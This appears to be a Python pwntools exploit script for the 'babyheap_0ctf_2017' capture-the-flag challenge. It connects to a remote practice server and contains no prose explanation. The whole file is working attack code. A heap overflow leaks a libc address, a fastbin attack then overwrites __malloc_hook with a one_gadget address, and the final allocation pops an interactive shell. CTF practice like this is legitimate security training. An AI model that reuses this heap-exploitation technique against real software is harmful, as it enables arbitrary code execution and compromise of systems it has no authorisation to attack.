from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-64.so"
# p = process([ld_path, "./babyheap_0ctf_2017"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("./babyheap_0ctf_2017", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 28667)
pro = ELF("./babyheap_0ctf_2017")
libc = ELF(libc_path)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def alloc(size):
    sla("Command: ", "1")
    sla("Size: ", str(size))

def fill(index, size, con):
    sla("Command: ", "2")
    sla("Index: ", str(index))
    sla("Size: ", str(size))
    sa("Content: ", con)

def free(index):
    sla("Command: ", "3")
    sla("Index: ", str(index))

def dump(index):
    sla("Command: ", "4")
    sla("Index: ", str(index))


# leak libc
alloc(0x10)   # 0
alloc(0x10)   # 1
alloc(0x60)   # 2
alloc(0x10)   # 3
pad = cyclic(0x10)+p64(0)+p64(0x91)
fill(0, len(pad), pad)
free(1)
alloc(0x10)   # 1
dump(2)
rud("Content: \n")
info = u64(ru("\x7f").ljust(8, b"\x00"))
print(hex(info))

# count offset
malloc_hook = info-0x68
print("malloc hook: ", hex(malloc_hook))
base = malloc_hook-libc.sym["__malloc_hook"]
oneshot = base+0x4526a

# fast bin attack
# alloc to malloc_hook
free(2)
pad = cyclic(0x10)+p64(0)+p64(0x71)+p64(malloc_hook-0x23)
fill(1, len(pad), pad)
alloc(0x60)  # 2
alloc(0x60)  # 4
pad = cyclic(0x13)+p64(oneshot)
fill(4, len(pad), pad)

# attack
alloc(0x1)

shell()


